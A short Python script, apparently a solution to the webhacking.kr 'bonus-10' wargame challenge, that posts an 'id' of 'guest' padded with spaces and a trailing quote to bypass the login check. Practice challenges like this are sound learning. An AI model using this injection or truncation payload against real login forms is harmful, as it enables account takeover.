import requests

URL = "https://webhacking.kr/challenge/bonus-10/"
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID}

crack = 'guest' + 9*' ' + '\''


data = { "id": crack }
    
response = requests.post(url=URL, cookies=cookies, data=data)                                

print(response.text)

    